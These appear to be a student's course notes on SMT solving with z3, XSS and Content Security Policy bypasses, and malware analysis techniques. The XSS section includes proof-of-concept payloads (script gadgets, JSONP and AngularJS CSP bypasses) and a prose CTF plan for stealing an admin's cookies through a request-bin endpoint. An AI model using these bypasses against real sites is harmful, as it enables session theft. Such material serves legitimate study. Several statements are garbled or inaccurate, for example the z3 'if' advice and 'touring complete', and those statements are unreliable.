> SMT (Satisfiability Modulo Theories) is a generalization of  the boolean satisfiability problem.
> 
> An SMT solver is a program which can automatically  determine if a certain set of constraints (expressed in  first-order logic) is satisfiable, and if so, find the solution(s).

It is a NP-hard problem, which means that it is very difficult to find a solution in a reasonable amount of time. Still, by performing some optimizations it can be done by narrowing down the problem.

**What is a SMT solver?**

It is made up of two things: A SAT solver and a Theory Solver. Examples of the latter:

1. BitVector
2. Integer
3. Uninterpreted function
4. Array

How do these two things get combined? It is a set of formulas that needs to be satisfied all together, for e.g.:

$$
\left\{
    \begin{array}{ll}
x1 ∨ ¬x2 ∨ x3 ∨ ¬x4 \\

x1 ∨ x2 \\

x1 ∨ x4 ∨ x3 \\
\end{array}
\right.
$$
If we find a contradiction we can find what are the formulas that generates them and individually fix them. If the solution set is found, we are done. To recap:

1. The SAT solver generates the set of formulas, it finds an assignment
2. The SAT sends the assignment to the Theory solver, which interprets is a linear equation problem. It finds another assignment and bounces it back to the SAT solver
3. The loop begins again, until a solution is found.

#### SMT solver in practice

```python
x = z3.Int('x')
y = z3.Int('y')
z = z3.Int('z')
solver = z3.Solver()
solver.add(x > y)
solver.add(y > z)
solver.add(z >= 3)
solver.add(z <= 5)
>>> solver.check()
sat
>>> model = solver.model()
>>> model.eval(x)
5
>>> model.eval(y)
4
>>> model.eval(z)
3
```

**Note**: the solver can be called directly without passing by the model. The problem with that is that there's no guarantee that if we have more than one variable, they are coherent with each other. For example, if we have multiple assignments for some variable, if we call directly the solver, we get contrasting output because they do not belong to the same model.

##### Important note about `if` statements in Z3

The Z3 solver does not behave very well with the python `if` statement. This means that we are forced to use `z3.Int()` to avoid running into issues later on. In practice:

```python
def f(a, b):
 if a < 1:
 return a
 if b > 1:
 return a + b
 return b
```

the code above will not work. The code below will do just fine.

```python
def f(a, b):
 if2 = z3.If(b > 1, a + b, b)
 if1 = z3.If(a < 1, a, if2)
 return if1
```

#### z3 example

> The following example demonstrates how to create bit-vector variables and constants. The function `BitVec('x', 16)` creates a bit-vector variable in Z3 named `x` with `16` bits. For convenience, integer constants can be used to create bit-vector expressions in Z3Py. The function `BitVecVal(10, 32)` creates a bit-vector of size `32` containing the value `10`.
> 
> ```python
> x = BitVec('x', 16)
> y = BitVec('y', 16)
> ```

### XSS

Attack against users that uses the server as a mean to propagate. It can be used to steal cookies or more generally to execute unsafe code on target machines. It can also be used to impersonate the user and execute HTTP requests impersonating him.

#### Prevention

Spoiler: all the method listed below fails.

1. **Whitelisting**

2. **Escaping**

   contextual  auto-escaping template example:

   ```html
   <body>
    <span style="color:{{ USER_COLOR }};">
    Hello {{ USERNAME }}, view your <a href="{{ USER_ACCOUNT_URL }}">Account</a>.
    </span>
    <script>
    var id = {{ USER_ID }};
    alert("Your user ID is: " + id);
    </script>
   </body>
   ```

3. **HTML sanitization**

   Example: [cure53/DOMPurify: DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. Demo: (github.com)](https://github.com/cure53/DOMPurify)

   Note that those can be bypassed with **script gadgets**. A script gadget is a piece of JavaScript code which reacts to  the presence of specifically formed DOM content. At its essence, the (combination of) script gadgets  transforms a piece of benign HTML code in the DOM  into executable code, Mitigations (e.g., CSP, HTML sanitizers) may leave the  HTML code as is, and rightfully so (it was benign code!).  Thanks to the presence of the script gadget, the code is  rendered executable. For example the following snippet:

   ```html
   <div data-role="button" data-text="&lt;script&gt;alert(1)&lt;/script&gt;"></div>
   ```

   Even if escaped, gets executed thanks to the following piece of code:

   ```html
   <script>
    var buttons = $$("[data-role=button]");
    buttons.html(buttons[0].getAttribute("data-text"));
   </script>
   ```

#### Bad prevention

* **Blacklists**: Don't blacklist, ever.  At least whitelist, since [attackers are really smart](https://owasp.org/www-community/attacks/xss/#).

* **In-browser XSS Filters**: Implemented in Chrome (XSS Auditor) and IE/Edge. They can be bypassed in various cases, and are mostly  deprecated.

* **XSS Auditor**: program sitting between the HTML parser and the JS engine to look for unwanted javascript code.

* **CSP**: Allows to define a policy to specify exactly what  resources can be executed. Example from babycsp ctf:

  ```javascript
  CSP: default-src 'self'; script-src 'self' *.google.com; connect-src *
  ```

  Two types of CSP:

  1. **Whitelist** based approach: specify the sources of scripts that can be executed. The following CSP

     ```javascript
     Content-Security-Policy: default-src http://example.com;
     object-src 'none'
     ```

     Executes this `<script src="http://example.com/scripts/a.js"></script>`, but not this `<script src="http://google.com/script/b.js"></script>` or this `<script>alert(1)</script>`.

  2. **Nonce** based approach: specify exactly which scripts to allow. It works by generating random numbers and placing it into `script-src`:

     ```javascript
     Content-Security-Policy: default-src 'none' object-src 'none' script-src 'nonce-r4nd0m'
     ```

     Thanks to that we cannot inject old libraries, since not nonced code will not be executed (`<script src="..." nonce="r4nd0m">`). Also hashed could be used.

     Since this will block the usage of event handlers, there's `unsafe-hashes` that allows to whitelist specific event handlers  by hash.

  **A 2016 study found that >95% of the Web’s whitelists  are automatically bypassable... This is due to JS libraries that allow easy bypass being  hosted on popular CDNs.**

#### More on CSP avoidal

There are really lots of methods to trick CSP.

1. **JSONP**

   If a whitelisted domain contains a JSONP endpoint, we can bypass it:

   ```javascript
   Content-Security-Policy: script-src 'self' https://whitelisted.com;
   object-src: 'none'
   ```

   This will work:

   ```javascript
   <script src="https://whitelisted.com/jsonp?callback=alert">
   ```

2. **AngularJS 1.x expressions**

   ```javascript
   Content-Security-Policy: script-src 'self' https://whitelisted.com;
   object-src: 'none'
   ```

   ```javascript
   <script 
   src="https://whitelisted.com/angularjs/1.1.3/angular.min.js
   "></script>
   <div ng-app ng-csp id=p ng-click=$$event.view.alert(1337)>
   ```

#### `strict-dynamic`

**Problem with nonce and hash-based CSP**: some scripts load, in turn, other scripts. Such scripts don’t have the nonce, which means that they aren’t trusted, and we can’t allow arbitrary script generation either,  otherwise we would leave out a lot of DOM-based XSS sinks (e.g., innerHTML).

**Solution**: dynamically propagate the trust to generated scripts if inserted explicitly in the DOM, not by a parser. This is enabled by `strict-dynamic`.

#### How to solve CSP challenges

XSS attacks are performed on end users, not servers. To get data out to them, we perform HTTP requests to servers that we control. We can use requestbin.net or pipedream.com to achieve that. They generate endpoints to which we can perform requests, thus simulating an attack target.

**For example, to solve babycsp**: We need a page that makes an HTTP req to reqbins, and that sends to it all the cookies. Then we use the XSS vulnerability on the website of the challenge to make the admin visit that webpage, and we should be all set.

### Malware Analysis

Note that machines are touring complete, which means that we cannot analyze any program. Whatever type of analysis we do on malwares, it is always going to be limited. Two types on analysis:

1. **Static analysis**: on the binary without being ran.

   Pros:

   *  \+ Code coverage

   Cons:

   * Code can be obfuscated (for e.g. movfuscator)

2. **Dynamic analysis**: on the binary while it is running. It is interested in what the malware is actually doing. For e.g. the malware needs to do a sys call to execute any action on the system (injecting code, manipulating the kernel, etc.).

   Cons:

   * \-  Code coverage

#### Fingerprint matching

It works by identifying a pattern of bytes that are usually some specific instructions. Those are basically glorified regexp.

A more complex approach is to fingerprint the control flow of the program. This aproach was first born to deal with polymorphic malwares, which btw are not usually worth it becase regular malwares are usually more than enough.

#### More on analysis

Usually this approach is made harder by malware authors by using a technique called **packing**, which works by encrypting its payload.

A first approach to **dynamic analysis** would be to run the malware in a sandbox, and to look for how it behaves with memory, syscalls and network access. Also using a debugger and a memory forensic (for e.g. nGB and mkB), which is used to look at infected machine memory, are really good in detecting unknown behaviour. Dynamic analysis is avoided by performing some checks to understand if we are in a analysis environment, and thus by acting differently in order to avoid being reverse engineered.

#### packing

it works by changing the `.text` section at runtime. When we want to run the malware, this section is unpacked and the code jumps there. We have various types of packing, depending on packing levels and on the approach:

* linear packing
* Cyclic packing
* interleaved packing

**About trace**: traces end when an unconditional jump is met.

#### Artifacts

Those are what malwares exploit to avoid detection based anti-malware techniques. Common practices implemented by evasive malwares:

1. Code cache artifacts
   * Bugged instruction pointer: in the stack we have the correct sEIP. But if we have some instruction, for e.g. `int 2e`, which performs a transition from user mode to kernel mode, the IP will be changed.
2. JIT compiler detection
3. Environment artifacts
4. Overhead detection
